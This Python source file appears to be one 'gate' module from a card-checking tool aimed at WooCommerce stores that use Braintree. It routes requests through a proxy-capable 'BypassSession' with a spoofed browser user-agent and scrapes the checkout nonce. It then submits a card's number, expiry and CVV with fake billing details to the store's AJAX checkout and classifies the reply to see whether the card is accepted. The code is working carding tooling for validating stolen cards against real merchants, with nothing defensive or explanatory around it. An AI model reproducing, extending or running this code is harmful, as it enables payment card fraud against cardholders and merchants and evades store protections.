"""WooCommerce Braintree Auth Engine — core/gates/braintree_auth.py

Direct WooCommerce Braintree payment gateway integration.
Fetches nonces, client tokens, CSRF tokens, and submits auth payloads.
"""

import re
import json
import logging
from typing import Dict, Any, Optional
from core.bypass_client import BypassSession
from core.gates.vbv import classify_gate_response

logger = logging.getLogger(__name__)


async def braintree_auth_check(
    card,
    site_url: str = "https://example-woo-store.com",
    proxy: Optional[str] = None,
    timeout: int = 25,
) -> Dict[str, Any]:
    """Perform WooCommerce Braintree auth check directly against target merchant."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        async with BypassSession(proxy=proxy, timeout=timeout, headers=headers) as client:
            # Step 1: Get checkout page to extract WooCommerce Nonce & Client Token
            checkout_url = f"{site_url.rstrip('/')}/checkout/"
            resp = await client.get(checkout_url)
            
            if resp.status_code != 200 or not resp.text:
                return {
                    "status": "ERROR",
                    "response": f"Failed to reach checkout (HTTP {resp.status_code})",
                    "price": "0.00",
                    "gateway": "WooCommerce Braintree",
                }

            html = resp.text

            # Extract wc-ajax nonce
            nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', html)
            if not nonce_match:
                nonce_match = re.search(r'_wpnonce["\']:\s*["\']([^"\']+)["\']', html)
            
            nonce = nonce_match.group(1) if nonce_match else ""

            # Step 2: Build WooCommerce Checkout AJAX Payload
            post_data = {
                "billing_first_name": "John",
                "billing_last_name": "Doe",
                "billing_company": "",
                "billing_country": "US",
                "billing_address_1": "123 Main St",
                "billing_address_2": "",
                "billing_city": "New York",
                "billing_state": "NY",
                "billing_postcode": "10001",
                "billing_phone": "2125550199",
                "billing_email": "johndoe@example.com",
                "payment_method": "braintree_credit_card",
                "woocommerce-process-checkout-nonce": nonce,
                "braintree_cc_number": card.number,
                "braintree_cc_exp": f"{card.month}/{card.year[-2:]}",
                "braintree_cc_cvv": card.cvv,
            }

            ajax_url = f"{site_url.rstrip('/')}/?wc-ajax=checkout"
            headers["X-Requested-With"] = "XMLHttpRequest"
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"

            res = await client.post(ajax_url, data=post_data, headers=headers)
            
            status, msg = classify_gate_response(res.text, res.status_code)
            return {
                "status": status,
                "response": msg,
                "price": "1.00",
                "gateway": "WooCommerce Braintree",
            }

    except Exception as e:
        logger.error("Braintree Auth Check error for %s: %s", site_url, e)
        return {
            "status": "ERROR",
            "response": f"Braintree Check Error: {str(e)[:50]}",
            "price": "0.00",
            "gateway": "WooCommerce Braintree",
        }
